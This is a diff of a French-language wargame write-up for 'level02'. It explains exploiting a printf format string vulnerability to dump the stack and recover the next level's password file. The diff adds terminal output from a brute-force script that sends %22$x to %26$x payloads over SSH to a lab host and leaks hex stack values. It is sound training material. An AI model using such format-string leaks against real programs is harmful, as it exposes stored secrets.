@@ -1,4 +1,32 @@
-On remarque que dans ce binaire il fait un printf avec un input comme le premier parametre donc on va abuser le format string vulnerability. on remarque que le contenu de /home/users/level03/.pass est sur la stack donc grace a format string vulnerability on va afficher les contenus de stack puis on va chercher le mot de pass.
+On remarque que dans ce binaire il fait un printf avec un input comme le premier parametre donc on va abuser le format string vulnerability.
+On remarque que le contenu de /home/users/level03/.pass est sur la stack donc grace a format string vulnerability, on va afficher les contenus de stack puis on va chercher le mot de pass.
+
+
+
+┌─[ryaoi@e1r7p17] - [~] - [Sun Oct 28, 17:48]
+└─[$] <> python2.7 bruteforce.py
+[+] Connecting to 172.16.70.130 on port 4242: Done
+[!] Couldn't check security settings on '172.16.70.130'
+[TEST]%22$x
+[+] Opening new channel: './level02': Done
+('[GOOD]', 'AAAA|756e505234376848 does not have access!\n', 22)
+[*] Closed SSH channel with 172.16.70.130
+[TEST]%23$x
+[+] Opening new channel: './level02': Done
+('[GOOD]', 'AAAA|45414a3561733951 does not have access!\n', 23)
+[*] Closed SSH channel with 172.16.70.130
+[TEST]%24$x
+[+] Opening new channel: './level02': Done
+('[GOOD]', 'AAAA|377a7143574e6758 does not have access!\n', 24)
+[*] Closed SSH channel with 172.16.70.130
+[TEST]%25$x
+[+] Opening new channel: './level02': Done
+('[GOOD]', 'AAAA|354a35686e475873 does not have access!\n', 25)
+[*] Closed SSH channel with 172.16.70.130
+[TEST]%26$x
+[+] Opening new channel: './level02': Done
+('[GOOD]', 'AAAA|48336750664b394d does not have access!\n', 26)
+[*] Closed SSH channel with 172.16.70.130
 
 >>> def hex_to_string(arr):
 ...     get_all = []
